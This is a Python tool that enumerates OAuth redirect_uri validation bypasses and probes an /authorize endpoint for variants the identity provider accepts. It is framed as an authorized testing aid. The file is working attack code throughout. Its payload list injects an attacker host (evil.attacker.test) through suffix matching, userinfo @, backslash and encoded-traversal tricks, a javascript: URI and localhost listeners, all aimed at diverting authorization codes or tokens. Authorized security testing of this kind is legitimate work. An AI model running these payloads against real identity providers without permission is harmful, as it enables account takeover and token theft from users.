#!/usr/bin/env python3
"""
oauth_redirect_fuzz.py - enumerate redirect_uri validation bypasses against an OAuth/OIDC /authorize endpoint (authorized).

The #1 OAuth bug: if the IdP delivers the code/token to a redirect_uri you control, that is account takeover. This takes a
real authorization request, swaps redirect_uri through the standard bypass set, and (with --send) probes which variants the
IdP does NOT reject -- WITHOUT following redirects and WITHOUT completing any flow. It baselines against the legit value so
"the IdP errored" vs "the IdP accepted" is a real signal, not a guess.

A variant is INTERESTING when the IdP responds like it did for the legit redirect_uri (302 toward a redirect, or a
login/consent 200) instead of an error page. That is a LEAD -- you must still manually confirm the code/token actually
reaches your host (watch your listener) before claiming impact.

SAFE: read-only GETs, redirects NOT followed, no credentials/cookies sent, injects only the host you pass to --evil.
Default is dry-run (prints candidates). Authorized targets only.

Usage:
  python3 oauth_redirect_fuzz.py --url "https://idp/authorize?client_id=x&redirect_uri=https://app.example.com/cb&response_type=code&scope=openid&state=s"
  python3 oauth_redirect_fuzz.py --url "<authorize url>" --evil evil.attacker.test --send
"""
import argparse, sys, urllib.parse, urllib.request, urllib.error


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # do NOT follow -- we want to see the 3xx and its Location


def candidates(legit, evil):
    """Standard redirect_uri bypass set, templated on the legit value and the attacker host."""
    u = urllib.parse.urlparse(legit)
    host = u.netloc
    scheme = u.scheme or "https"
    path = u.path or "/"
    ev = evil
    out = [
        (f"{scheme}://{host}.{ev}{path}", "suffix / not-anchored allow-list"),
        (f"{scheme}://{ev}/?x={host}{path}", "substring match"),
        (f"{scheme}://{host.split('.')[0]}{ev}{path}" if "." in host else f"{scheme}://{ev}{path}", "loose prefix/subdomain"),
        (f"{scheme}://{host}@{ev}{path}", "@ userinfo -> real host is attacker"),
        (f"{scheme}://{ev}#{host}{path}", "fragment"),
        (f"{scheme}://{ev}\\@{host}{path}", "backslash parser differential"),
        (f"{scheme}://{ev}%2f%2e%2e{host}/", "encoded traversal"),
        (f"{scheme}://{host}%2523@{ev}/", "double-encoding"),
        (f"{legit.rstrip('/')}/../redirect?url={scheme}://{ev}/", "path traversal -> open redirect on allowed host"),
        (f"{legit.rstrip('/')}/%2e%2e/oauth/echo", "traversal to a reflecting endpoint on allowed host"),
        (f"http://localhost:1337/", "localhost listener"),
        (f"http://127.0.0.1:1337/", "loopback listener"),
        (f"javascript://{host}/%0aalert(document.domain)", "javascript: scheme abuse"),
        (f"", "empty value -> fallback-to-registered / reflect"),
    ]
    # de-dupe while preserving order
    seen, uniq = set(), []
    for val, why in out:
        if val not in seen:
            seen.add(val)
            uniq.append((val, why))
    return uniq


def build_url(base, params, new_ru):
    p = dict(params)
    p["redirect_uri"] = [new_ru]
    q = urllib.parse.urlencode({k: v[0] for k, v in p.items()}, safe=":/@#?&=%.\\")
    return urllib.parse.urlunparse((base.scheme, base.netloc, base.path, "", q, ""))


def probe(url, timeout):
    """Return (status, location, note) without following redirects."""
    opener = urllib.request.build_opener(_NoRedirect)
    req = urllib.request.Request(url, headers={"User-Agent": "oauth-redirect-fuzz/authorized"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.headers.get("Location", ""), ""
    except urllib.error.HTTPError as e:  # includes the 3xx we blocked
        return e.code, e.headers.get("Location", "") if e.headers else "", ""
    except Exception as e:
        return None, "", f"{type(e).__name__}: {e}"


def classify(status, location, evil, base_status):
    if status is None:
        return "err"
    loc = location or ""
    if evil and evil in loc:
        return "ACCEPTED->EVIL"   # strongest signal: IdP is redirecting toward attacker host
    if status in (301, 302, 303, 307, 308) and loc:
        return "redirect"
    if status == 400 or status == 403:
        return "rejected"
    if base_status is not None and status == base_status:
        return "like-legit"
    return f"http{status}"


def main():
    ap = argparse.ArgumentParser(description="redirect_uri bypass enumerator/prober (authorized only).")
    ap.add_argument("--url", required=True, help="captured /authorize URL containing redirect_uri (quote it)")
    ap.add_argument("--evil", default="evil.attacker.test", help="attacker host to inject (use one you control)")
    ap.add_argument("--send", action="store_true", help="live-probe each candidate (no redirect following). Default: dry-run")
    ap.add_argument("--timeout", type=float, default=15.0)
    a = ap.parse_args()

    base = urllib.parse.urlparse(a.url)
    params = urllib.parse.parse_qs(base.query, keep_blank_values=True)
    legit = (params.get("redirect_uri") or [""])[0]
    if not legit:
        sys.exit("[!] no redirect_uri found in --url")
    print(f"[i] legit redirect_uri : {legit}")
    print(f"[i] injecting host      : {a.evil}")
    print(f"[i] mode                : {'LIVE PROBE (no redirect follow)' if a.send else 'dry-run (candidates only)'}\n")

    base_status = None
    if a.send:
        base_status, base_loc, note = probe(a.url, a.timeout)
        print(f"[baseline legit] status={base_status} location={base_loc[:80]}  {note}\n")

    for val, why in candidates(legit, a.evil):
        cand_url = build_url(base, params, val)
        if not a.send:
            print(f"  [{why}]\n    redirect_uri={val or '(empty)'}")
            continue
        status, loc, note = probe(cand_url, a.timeout)
        verdict = classify(status, loc, a.evil, base_status)
        flag = "  <== INTERESTING" if verdict in ("ACCEPTED->EVIL", "like-legit", "redirect") and verdict != "rejected" else ""
        print(f"  [{verdict}] status={status} {why}")
        print(f"      redirect_uri={val or '(empty)'}")
        if loc:
            print(f"      Location: {loc[:120]}")
        if note:
            print(f"      note: {note}")
        if verdict == "ACCEPTED->EVIL":
            print("      *** IdP is redirecting toward your host -- confirm code/token arrives at your listener. ***")
        print(flag) if flag else None

    print("\n[i] A non-rejected variant is a LEAD. Confirm the code/token actually reaches YOUR host before reporting ATO.")


if __name__ == "__main__":
    sys.exit(main())
